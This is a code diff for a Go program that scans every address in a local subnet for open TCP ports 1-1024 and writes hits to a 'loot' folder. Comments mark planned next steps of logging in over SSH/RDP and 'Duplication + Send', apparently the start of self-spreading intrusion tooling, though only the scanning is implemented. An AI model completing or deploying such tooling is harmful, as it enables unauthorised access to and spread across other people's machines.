@@ -1,6 +1,7 @@
 package main
 
 import (
+	_ "bufio"
 	"errors"
 	"fmt"
 	"log"
@@ -48,6 +49,9 @@ func strlen(s string, c chan int) {
 }
 
 var ip = "192.168.3.219"
+var ipAddr = "192.168.3."
+var minOctet = 1
+var maxOctet = 254
 var minPort = 1
 var maxPort = 1024
 var sshPort = 22
@@ -59,13 +63,31 @@ func testTCPConnection(ip string, port int, doneChan chan bool, file *os.File) {
 		log.Printf("Port %d: Open\n", port)
 
 		// Write bytes to the file
-		byteSlicePortFile := []byte("Open Ports: " + strconv.Itoa(port) + "\n")
+		byteSlicePortFile := []byte("IP Address: " + ip + " Open Ports: " + strconv.Itoa(port) + "\n")
 		bytesWrittenPortFile, err := file.Write(byteSlicePortFile)
 		if err != nil {
 			log.Fatal(err)
 		}
 		log.Println("Port Bytes written:", bytesWrittenPortFile)
 	}
+	doneChan <- true
+}
+
+func dumpDetails(ip string, port int, doneChan chan bool, file *os.File) {
+	_, err := net.DialTimeout("tcp", ip+":"+strconv.Itoa(port), time.Second)
+
+	// Writing the IP and port to a dedicated file to iterate over once we've gotten their deets
+	// This assumes that the func above works fine
+	// Once we've got the deets, we go over this for SSH/RDP
+	if err == nil {
+		byteSlicePortFile := []byte(ip + ":" + strconv.Itoa(port) + "\n")
+		bytesWrittenPortFile, err := file.Write(byteSlicePortFile)
+		if err != nil {
+			log.Fatal(err)
+		}
+		log.Println("Dump bytes written:", bytesWrittenPortFile)
+	}
+
 	doneChan <- true
 }
 
@@ -167,10 +189,11 @@ func main() {
 
 	//TIP PT 2a. Scan ports
 
-	// Btw, the stuff down here I can't test because my laptop is being a chud
+	// Btw, the stuff down here I can't test because my laptop is being a chump
 	doneChannel := make(chan bool)
+
 	// Write open ports to file
-	portFile, err := os.Create("drop_here/ports.txt")
+	portFile, err := os.Create("loot/ports.txt")
 	if err != nil {
 		err := errorHandler(err)
 		if err != nil {
@@ -181,16 +204,38 @@ func main() {
 	log.Println(portFile)
 	defer portFile.Close()
 
-	for port := minPort; port <= maxPort; port++ {
-		go testTCPConnection(ip, port, doneChannel, portFile)
+	dumpFile, err := os.Create("loot/ips.txt")
+	if err != nil {
+		err := errorHandler(err)
+		if err != nil {
+			return
+		}
+		log.Fatal(err)
+	}
+	log.Println(dumpFile)
+	defer dumpFile.Close()
+
+	// Iterate over a range of IPs, return the port that's open
+	for octet := minOctet; octet <= maxOctet; octet++ {
+		var fullIP = ipAddr + strconv.Itoa(octet)
+
+		for port := minPort; port <= maxPort; port++ {
+			//go testTCPConnection(fullIP, port, doneChannel, portFile) // <- Might not even need this anymore?
+			go dumpDetails(fullIP, port, doneChannel, dumpFile)
+		}
 	}
 
 	// Wait for routines to finish
-	for port := minPort; port <= maxPort; port++ {
-		<-doneChannel
+	for octet := minOctet; octet <= maxOctet; octet++ {
+		for port := minPort; port <= maxPort; port++ {
+			<-doneChannel
+		}
 	}
 
 	//TIP PT 2b. SSH/RDP into ports
+	// SSH
+
+	// RDP or however you get into Windows
 
 	//TIP PT 3. Duplication + Send
 
